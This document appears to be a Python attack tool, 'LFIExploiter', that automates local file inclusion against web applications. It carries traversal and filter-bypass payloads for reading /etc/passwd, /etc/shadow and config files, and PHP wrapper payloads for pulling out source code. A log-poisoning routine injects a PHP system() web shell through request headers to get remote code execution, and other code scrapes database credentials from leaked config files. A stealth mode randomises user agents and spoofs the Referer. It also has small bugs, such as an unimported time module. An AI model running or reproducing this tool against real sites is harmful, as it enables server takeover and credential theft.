#!/usr/bin/env python3

import os
import re
import sys
import base64
import random
import requests
import urllib.parse
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import track
from bs4 import BeautifulSoup

console = Console()

class LFIExploiter:
    def __init__(self, url, param, proxies=None, tor=False, stealth=False, delay=0, output=None):
        self.url = url
        self.param = param
        self.proxies = proxies
        self.tor = tor
        self.stealth = stealth
        self.delay = delay
        self.output = output
        self.results = []
        self.vulnerable = False
        self.exploited = False
        
        # Enhanced payloads based on your requirements
        self.payloads = {
            # Basic LFI payloads
            'basic': [
                "../../../../etc/passwd",
                "../../../../etc/shadow",
                "../../../../etc/hosts",
                "../../../../etc/motd",
                "../../../../etc/crontab",
                "../../../../var/log/apache2/access.log",
                "../../../../var/log/nginx/access.log",
                "../../../../proc/self/environ",
                "../../../../windows/win.ini",
                "C:\\Windows\\System32\\drivers\\etc\\hosts"
            ],
            
            # Filter bypass techniques
            'bypass': [
                "../../../../etc/passwd%00",
                "../../../../etc/passwd%00.jpg",
                "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "..\\..\\..\\..\\windows\\win.ini",
                "file:///etc/passwd",
                "////etc/passwd",
                "../../../../../../../../../../../../etc/passwd",
                "....//....//....//etc/passwd"
            ],
            
            # PHP wrapper payloads
            'php_wrappers': [
                "php://filter/convert.base64-encode/resource=index.php",
                "php://filter/convert.base64-encode/resource=config.php",
                "php://filter/convert.base64-encode/resource=wp-config.php",
                "php://filter/resource=index.php",
                "expect://whoami"
            ],
            
            # Archive payloads
            'archives': [
                "zip:///path/to/file.zip#file.txt",
                "phar:///path/to/file.phar/file.txt"
            ],
            
            # Log poisoning payloads
            'log_poisoning': [
                "../../../../var/log/apache2/access.log",
                "../../../../var/log/nginx/access.log",
                "../../../../var/log/httpd/access_log",
                "../../../../var/log/auth.log",
                "../../../../var/log/vsftpd.log",
                "../../../../var/log/sshd.log"
            ]
        }
        
        # Custom headers for stealth mode
        self.headers = {
            "User-Agent": self.get_random_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive"
        }
        
        if self.stealth:
            self.headers.update({
                "Referer": "https://www.google.com/",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0"
            })

    def get_random_user_agent(self):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36"
        ]
        return random.choice(user_agents)

    def test_lfi(self):
        console.print(Panel.fit("[bold yellow]Starting LFI Vulnerability Testing[/bold yellow]"))
        
        # Test basic payloads first
        for payload in track(self.payloads['basic'], description="Testing basic LFI payloads..."):
            result = self.test_payload(payload)
            if result['vulnerable']:
                self.vulnerable = True
                self.results.append(result)
                break
        
        # If vulnerable, test all payload types
        if self.vulnerable:
            console.print("[green]✓ LFI Vulnerability Found! Testing advanced exploitation...[/green]")
            
            for payload_type, payload_list in self.payloads.items():
                if payload_type == 'basic':
                    continue
                    
                for payload in track(payload_list, description=f"Testing {payload_type} payloads..."):
                    result = self.test_payload(payload)
                    if result['vulnerable']:
                        self.results.append(result)
        
        return self.vulnerable

    def test_payload(self, payload):
        try:
            # Add delay for stealth mode
            if self.delay > 0:
                time.sleep(self.delay + (random.uniform(0, 1.5) if self.stealth else 0))
            
            # Build URL with payload
            if "?" in self.url:
                test_url = f"{self.url}&{self.param}={payload}"
            else:
                test_url = f"{self.url}?{self.param}={payload}"
            
            # Send request
            response = requests.get(test_url, headers=self.headers, proxies=self.proxies, timeout=10)
            
            # Analyze response
            is_vulnerable, content = self.analyze_response(response, payload)
            
            result = {
                'payload': payload,
                'url': test_url,
                'vulnerable': is_vulnerable,
                'status': response.status_code,
                'content': content,
                'response_time': response.elapsed.total_seconds(),
                'type': 'LFI'
            }
            
            return result
            
        except Exception as e:
            return {
                'payload': payload,
                'url': test_url,
                'vulnerable': False,
                'error': str(e),
                'type': 'LFI'
            }

    def analyze_response(self, response, payload):
        content = response.text
        headers = str(response.headers).lower()
        
        # Common patterns for successful LFI
        lfi_patterns = [
            r"root:.*:0:0:",  # /etc/passwd pattern
            r"\[extensions\]",  # Windows win.ini pattern
            r"<\?php",  # PHP source code
            r"mysql_connect",  # Common in PHP config files
            r"BEGIN CERTIFICATE",  # SSL certificates
            r"SQLite",  # Database files
            r"<script",  # JavaScript in logs
            r"DOCTYPE html",  # HTML content
            r"Apache.*Server",  # Server info
            r"\[mysqld\]",  # MySQL config
            r"DB_NAME",  # WordPress config
            r"define\('DB_"  # PHP defines
        ]
        
        # Check for error messages that indicate vulnerability but file not found
        error_patterns = [
            r"failed to open stream",
            r"no such file or directory",
            r"file.*not.*found",
            r"warning.*include",
            r"path.*does.*not.*exist"
        ]
        
        # Check for successful file inclusion
        for pattern in lfi_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True, self.extract_interesting_content(content)
        
        # Check for error messages that indicate vulnerability
        for pattern in error_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True, "Vulnerable but file not found"
        
        # Special case for PHP wrapper responses
        if any(wrapper in payload for wrapper in ['php://filter', 'zip://', 'phar://']):
            if response.status_code == 200 and len(content) > 0:
                try:
                    # Try to decode base64 if it looks like base64
                    if len(content) % 4 == 0 and re.match(r'^[A-Za-z0-9+/]+={0,2}$', content):
                        decoded = base64.b64decode(content).decode('utf-8', 'ignore')
                        return True, decoded
                    return True, content
                except:
                    return True, content
        
        return False, None

    def extract_interesting_content(self, content):
        """Extract and format interesting content from LFI results"""
        try:
            # For /etc/passwd
            if "root:" in content:
                users = []
                for line in content.split('\n'):
                    if re.match(r'^[a-zA-Z0-9_-]+:', line):
                        users.append(line.split(':')[0])
                return f"Extracted users: {', '.join(users)}"
            
            # For PHP files
            elif "<?php" in content:
                # Extract interesting PHP configurations
                php_configs = []
                patterns = [
                    r"define\('DB_[A-Z_]+\',\s*'.*?'\)",
                    r"\$[a-zA-Z0-9_]+\s*=\s*'.*?'",
                    r"mysql_connect\(.*?\)",
                    r"new PDO\(.*?\)"
                ]
                
                for pattern in patterns:
                    matches = re.findall(pattern, content)
                    php_configs.extend(matches)
                
                if php_configs:
                    return "PHP Configurations Found:\n" + "\n".join(php_configs[:5]) + ("\n..." if len(php_configs) > 5 else "")
                return "PHP source code leaked"
            
            # For log files
            elif any(x in content.lower() for x in ['get /', 'post /', 'http/']):
                # Extract interesting log entries
                lines = content.split('\n')
                interesting = []
                keywords = ['admin', 'login', 'password', 'select', 'union', 'cmd=', 'exec']
                
                for line in lines:
                    if any(keyword in line.lower() for keyword in keywords):
                        interesting.append(line[:200] + ('...' if len(line) > 200 else ''))
                
                if interesting:
                    return "Interesting log entries:\n" + "\n".join(interesting[:5]) + ("\n..." if len(interesting) > 5 else "")
                return "Log file accessed"
            
            # For Windows files
            elif "[extensions]" in content.lower():
                return "Windows system file accessed"
            
            # For SSL certificates
            elif "BEGIN CERTIFICATE" in content:
                return "SSL certificate leaked"
            
            # Default case
            return content[:500] + ('...' if len(content) > 500 else '')
        
        except Exception as e:
            return f"Content extraction error: {str(e)}"

    def poison_logs(self, log_file_path):
        """Attempt to poison logs for RCE"""
        console.print(Panel.fit("[bold yellow]Attempting Log Poisoning[/bold yellow]"))
        
        # PHP code to inject
        php_code = "<?php system($_GET['cmd']); ?>"
        
        # Try with different headers
        injection_methods = [
            {'User-Agent': php_code},
            {'Referer': php_code},
            {'X-Forwarded-For': php_code},
            {'Cookie': f"test={php_code}"}
        ]
        
        for method in injection_methods:
            headers = self.headers.copy()
            headers.update(method)
            
            try:
                # Send the poisoned request
                requests.get(self.url, headers=headers, proxies=self.proxies, timeout=10)
                
                # Now try to access the log file with command execution
                test_url = f"{self.url}?{self.param}={log_file_path}&cmd=id"
                response = requests.get(test_url, headers=self.headers, proxies=self.proxies, timeout=10)
                
                if "uid=" in response.text or "gid=" in response.text:
                    self.exploited = True
                    return {
                        'payload': f"Log Poisoning via {list(method.keys())[0]}",
                        'url': test_url,
                        'vulnerable': True,
                        'status': response.status_code,
                        'content': response.text,
                        'type': 'LFI to RCE'
                    }
                    
            except Exception as e:
                continue
        
        return None

    def exploit(self):
        """Full exploitation chain"""
        if not self.test_lfi():
            console.print("[red]✗ Target is not vulnerable to LFI[/red]")
            return False
        
        # Display found vulnerabilities
        self.display_results()
        
        # Try to convert LFI to RCE via log poisoning
        for log_payload in self.payloads['log_poisoning']:
            result = self.poison_logs(log_payload)
            if result and result['vulnerable']:
                self.results.append(result)
                self.exploited = True
                break
        
        # Try PHP filter for source code disclosure
        if not self.exploited:
            for php_payload in self.payloads['php_wrappers']:
                result = self.test_payload(php_payload)
                if result['vulnerable'] and result['content']:
                    self.results.append(result)
                    # Try to extract database credentials from config files
                    if any(x in php_payload for x in ['config.php', 'wp-config.php']):
                        self.extract_db_credentials(result['content'])
        
        # Save results to file if output specified
        if self.output:
            self.save_results()
        
        return self.exploited

    def extract_db_credentials(self, content):
        """Extract database credentials from leaked source code"""
        db_patterns = {
            'DB_NAME': r"define\('DB_NAME',\s*'(.*?)'\)",
            'DB_USER': r"define\('DB_USER',\s*'(.*?)'\)",
            'DB_PASSWORD': r"define\('DB_PASSWORD',\s*'(.*?)'\)",
            'DB_HOST': r"define\('DB_HOST',\s*'(.*?)'\)",
            'mysql_connect': r"mysql_connect\(.*?'(.*?)'.*?'(.*?)'.*?'(.*?)'\)",
            'PDO': r"new PDO\(.*?'(.*?)'.*?'(.*?)'.*?'(.*?)'\)"
        }
        
        credentials = {}
        for key, pattern in db_patterns.items():
            matches = re.findall(pattern, content)
            if matches:
                credentials[key] = matches[0] if isinstance(matches[0], str) else matches[0][0]
        
        if credentials:
            console.print(Panel.fit("[bold red]⚠ Database Credentials Found![/bold red]"))
            for key, value in credentials.items():
                console.print(f"[yellow]{key}:[/yellow] [cyan]{value}[/cyan]")
            
            self.results.append({
                'type': 'DB_CREDENTIALS',
                'credentials': credentials,
                'source': 'config_file'
            })

    def display_results(self):
        """Display results in a beautiful format"""
        if not self.results:
            console.print("[yellow]⚠ No LFI vulnerabilities found.[/yellow]")
            return
        
        # Create a table for vulnerabilities
        vuln_table = Table(title="[bold]LFI Vulnerabilities Found[/bold]", show_lines=True)
        vuln_table.add_column("Payload", style="magenta")
        vuln_table.add_column("URL", style="green")
        vuln_table.add_column("Status", style="red")
        vuln_table.add_column("Response Time", style="cyan")
        vuln_table.add_column("Details", style="yellow")
        
        for result in self.results:
            if result['vulnerable']:
                status = str(result.get('status', 'N/A'))
                if status.startswith('2'):
                    status = f"[green]{status}[/green]"
                else:
                    status = f"[red]{status}[/red]"
                
                details = result.get('content', 'Vulnerable')[:100] + ('...' if len(result.get('content', '')) > 100 else '')
                
                vuln_table.add_row(
                    result['payload'],
                    result['url'],
                    status,
                    f"{result.get('response_time', 0):.2f}s",
                    details
                )
        
        console.print(vuln_table)
        
        # Show exploitation status
        if self.exploited:
            console.print(Panel.fit("[bold green]✓ Successfully exploited LFI to RCE![/bold green]"))
        else:
            console.print(Panel.fit("[bold yellow]✓ LFI Found but RCE not achieved[/bold yellow]"))

    def save_results(self):
        """Save results to output file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = f"{self.output}_{timestamp}.txt"
        
        try:
            with open(output_file, "w", encoding="utf-8") as f:
                f.write("="*80 + "\n")
                f.write(f"LFI Exploitation Report - {timestamp}\n")
                f.write("="*80 + "\n\n")
                
                f.write(f"Target URL: {self.url}\n")
                f.write(f"Parameter: {self.param}\n")
                f.write(f"Vulnerable: {'Yes' if self.vulnerable else 'No'}\n")
                f.write(f"Exploited: {'Yes' if self.exploited else 'No'}\n\n")
                
                f.write("-"*80 + "\n")
                f.write("Vulnerabilities Found:\n")
                f.write("-"*80 + "\n")
                
                for result in self.results:
                    if result['vulnerable']:
                        f.write(f"Payload: {result['payload']}\n")
                        f.write(f"URL: {result['url']}\n")
                        f.write(f"Status: {result['status']}\n")
                        f.write(f"Response Time: {result.get('response_time', 0):.2f}s\n")
                        
                        content = result.get('content', '')
                        if content:
                            f.write("\nContent:\n")
                            f.write("="*50 + "\n")
                            f.write(str(content)[:2000] + ('...' if len(str(content)) > 2000 else ''))
                            f.write("\n" + "="*50 + "\n")
                        
                        f.write("\n" + "-"*50 + "\n")
                
                # Add DB credentials if found
                db_creds = [r for r in self.results if r.get('type') == 'DB_CREDENTIALS']
                if db_creds:
                    f.write("\n" + "="*80 + "\n")
                    f.write("Database Credentials Found:\n")
                    f.write("="*80 + "\n")
                    
                    for cred in db_creds:
                        for key, value in cred['credentials'].items():
                            f.write(f"{key}: {value}\n")
                
                f.write("\n" + "="*80 + "\n")
                f.write("Exploitation Summary:\n")
                f.write("="*80 + "\n")
                f.write(f"LFI Vulnerable: {'Yes' if self.vulnerable else 'No'}\n")
                f.write(f"RCE Achieved: {'Yes' if self.exploited else 'No'}\n")
                f.write(f"Total Vulnerabilities Found: {len([r for r in self.results if r['vulnerable']])}\n")
            
            console.print(f"[green]✓ Results saved to {output_file}[/green]")
        except Exception as e:
            console.print(f"[red]✗ Error saving results: {str(e)}[/red]")

def main():
    # Example usage
    exploiter = LFIExploiter(
        url="http://example.com/vuln.php",
        param="file",
        proxies=None,
        stealth=True,
        delay=1,
        output="lfi_report"
    )
    
    if exploiter.exploit():
        console.print("[bold green]Exploitation successful![/bold green]")
    else:
        console.print("[bold yellow]Exploitation attempted but not successful[/bold yellow]")

if __name__ == "__main__":
    main()
    